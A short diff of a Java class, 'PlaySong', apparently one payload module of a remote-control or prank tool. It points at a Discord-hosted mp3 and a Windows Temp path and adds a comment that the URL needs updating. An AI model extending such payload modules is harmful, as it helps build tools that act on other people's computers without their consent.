@@ -15,7 +15,7 @@ import java.io.File;
 public class PlaySong implements PayloadExecutor {
     FileUtil fileUtil = new FileUtil();
 
-    String allahUrl = "https://cdn.discordapp.com/attachments/983114144712622160/1034539557166776350/allah.mp3";
+    String allahUrl = "https://cdn.discordapp.com/attachments/983114144712622160/1034539557166776350/allah.mp3"; //The URL needs to be updated
     String allahPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\allah.mp3";
 
     @Override
